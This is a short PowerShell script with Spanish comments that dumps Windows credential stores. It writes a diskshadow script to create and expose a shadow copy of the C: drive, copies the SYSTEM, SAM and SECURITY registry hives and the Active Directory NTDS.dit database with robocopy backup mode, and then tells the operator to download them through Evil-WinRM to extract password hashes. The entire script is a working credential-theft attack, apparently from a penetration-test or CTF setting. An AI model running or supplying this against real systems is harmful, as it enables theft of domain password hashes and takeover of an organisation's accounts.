# Detectar perfil de usuario actual
$userProfile = [Environment]::GetFolderPath("MyDocuments")

# Paths
$diskshadowFile = Join-Path $userProfile "diskshadow.txt"
$ntdsDir = Join-Path $userProfile "ntds"
$tempDir = $userProfile

# Crear script de diskshadow con saltos CRLF
$lines = @(
    'set verbose on',
    "set metadata C:\Windows\Temp\meta.cab",
    'set context clientaccessible',
    'set context persistent',
    'begin backup',
    'add volume C: alias cdrive',
    'create',
    'expose %cdrive% E:',
    'end backup'
)
[System.IO.File]::WriteAllLines($diskshadowFile, $lines)

# Ejecutar diskshadow
diskshadow /s $diskshadowFile

# Copiar hives de registro desde snapshot
robocopy /B "E:\Windows\System32\Config" $tempDir SYSTEM
robocopy /B "E:\Windows\System32\Config" $tempDir SAM
robocopy /B "E:\Windows\System32\Config" $tempDir SECURITY

# Crear carpeta para NTDS si no existe
if (!(Test-Path $ntdsDir)) {
    New-Item -Path $ntdsDir -ItemType Directory | Out-Null
}

# Copiar NTDS.dit
robocopy /B "E:\Windows\NTDS" $ntdsDir ntds.dit

Write-Host "`n✅ Archivos copiados:"
Write-Host "  - SYSTEM -> $tempDir\SYSTEM"
Write-Host "  - SAM     -> $tempDir\SAM"
Write-Host "  - SECURITY-> $tempDir\SECURITY"
Write-Host "  - ntds.dit-> $ntdsDir\ntds.dit"
Write-Host "`n👉 Ahora podés hacer 'download' desde Evil-WinRM para extraer hashes."
